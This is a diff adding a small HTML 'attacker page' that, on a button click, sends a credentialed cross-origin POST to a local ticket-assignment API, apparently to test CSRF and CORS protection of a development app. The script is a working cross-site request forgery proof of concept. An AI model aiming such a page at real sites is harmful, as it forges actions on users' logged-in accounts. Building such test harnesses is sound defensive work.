@@ -1,0 +1,29 @@
+<!doctype html>
+<html>
+  <body>
+    <h1>Attacker page (different origin)</h1>
+    <p>Click the button to attempt a cross-site request with the victim's cookie.</p>
+    <button id="attack">Send CSRF-ish request</button>
+
+    <pre id="output"></pre>
+
+    <script>
+      document.getElementById('attack').addEventListener('click', async () => {
+        const out = document.getElementById('output');
+        out.textContent = 'Sending fetch...';
+
+        try {
+          const res = await fetch('http://localhost:5005/api/tickets/1/assign', {
+            method: 'POST',
+            credentials: 'include', // ask browser to send cookies
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ assigneeId: 1 })
+          });
+          out.textContent = `Status: ${res.status} ${res.statusText}`;
+        } catch (err) {
+          out.textContent = `Fetch error (likely CORS): ${err}`;
+        }
+      });
+    </script>
+  </body>
+  </html>
